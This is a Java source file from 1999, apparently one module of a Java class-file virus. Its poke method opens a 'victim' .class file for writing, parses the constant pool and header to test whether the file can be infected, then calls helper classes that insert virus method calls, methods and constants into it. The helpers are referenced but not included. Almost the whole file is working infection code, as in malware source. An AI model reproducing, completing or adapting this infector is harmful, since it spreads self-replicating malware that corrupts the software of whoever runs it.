//=============================================================
//
// Title:  e89a763c.java
// Author: Landing Camel International
// Date:   January 1999
//
// Notes:  This class checks class file for infection status
//
//=============================================================

import java.util.*;
import java.io.*;

public class e89a763c {

   private int virus_cp_count = 95;
   private c8f67b45 virusinvoke = new c8f67b45();
   private dc98e742 virusmethod = new dc98e742();
   private be93a29f virusconst = new be93a29f();
   public Hashtable hash = new Hashtable();
   RandomAccessFile temp;
   
   //----------------------------------------------------------
   public boolean poke(File entry) throws IOException {
   	
      int temp_magic;
      int temp_cp_count;
      int temp_cp_pointer;
      int delta_offset;
      int temp_access_flags;
      int temp_this_class;
      int temp_super_class;
      int temp_interfaces;
      int temp_fields;
      int temp_m_count_pointer;
      int temp_m_count;
      int temp_m_pointer;
      boolean isInvalid = false;
      
      //open victim for reading and writing
      temp = new RandomAccessFile(entry,"rw");

      //initialise fpointer
      a98b34f2 ptr = new a98b34f2(temp);

      //read temp_magic
      ptr.seek();
      temp_magic = temp.readInt();

      //test temp_magic
      if (temp_magic != 0xCAFEBABE) isInvalid = true;

      //read temp_cp_count
      ptr.update(8);                   
      temp_cp_count = temp.readUnsignedShort();

      //test temp_cp_count
      if (temp_cp_count > 160) isInvalid = true;

      //calculate delta_offset
      delta_offset = temp_cp_count - 1;

      //iterate through temp_cp
      ptr.update(2);
      for (int i = 1; i < temp_cp_count; i++) {
         int tag = temp.readUnsignedByte();
         ptr.fpointer++;
         switch (tag) {
            case 7: hash.put(new Integer(i),new Integer(temp.readUnsignedShort()));
            case 8: ptr.update(2);
                    break;
            case 3:
            case 4:
            case 9:
            case 10:
            case 11:
            case 12: ptr.update(4);
                     break;
            case 5:
            case 6: ptr.update(8);
                    i++;
                    break;
            case 1: String str = temp.readUTF();
                    hash.put(new Integer(i),str);
                    ptr.seek((int)temp.getFilePointer());
                    break;
         }
      }            
                  
      //read temp_cp_pointer
      temp_cp_pointer = ptr.fpointer;

      //read temp_access_flags
      temp_access_flags = temp.readUnsignedShort();

      //test temp_access_flags for ACC_PUBLIC and ACC_SUPER
      if ((temp_access_flags != 0x21) && (temp_access_flags != 0x1)) isInvalid = true;

      //read temp_this_class
      ptr.update(2);
      temp_this_class = temp.readUnsignedShort();

      //read temp_super_class
      ptr.update(2);
      temp_super_class = temp.readUnsignedShort();            

      //test temp_super_class
      if ((temp_super_class == 0) ||
          (!hash.get(hash.get(new Integer(temp_super_class))).equals("java/lang/Object"))) isInvalid = true;      

      //read temp_interfaces
      ptr.update(2);
      temp_interfaces = temp.readUnsignedShort();

      if (temp_interfaces != 0) isInvalid = true;

      //iterate through interfaces
      ptr.update(2*(temp_interfaces) + 2);   

      //read temp_fields
      temp_fields = temp.readUnsignedShort();

      //iterate through fields
      ptr.update(2);
      for (int i = 0; i < temp_fields; i++) {
         ptr.update(6);
         int temp_f_count = temp.readUnsignedShort();
         ptr.update(8*(temp_f_count) + 2);
      }

      //read temp_m_count_pointer
      temp_m_count_pointer = ptr.fpointer;

      //read temp_m_count
      temp_m_count = temp.readUnsignedShort();
            
      //read temp_m_pointer
      ptr.update(2);
      temp_m_pointer = ptr.fpointer;
      
      if (isInvalid) {       	
      	 temp.close();
      	 return false;      	 
      }      	        
      
      temp_m_pointer = virusinvoke.insert(temp_m_count, temp_m_pointer, 
                                          delta_offset, temp, ptr, hash);

      if (temp_m_pointer == 0) {
      	 temp.close();
      	 return false;
      }	 
      
      virusmethod.insert(temp_m_count_pointer, temp_m_count,
                         temp_m_pointer, delta_offset, temp, ptr);

      virusconst.insert(temp_cp_count, temp_cp_pointer, 
                        delta_offset, temp_this_class,
                        temp_super_class, temp, ptr);                                           

      temp.close();      
      
      return true;

   }
   //----------------------------------------------------------

} // End class
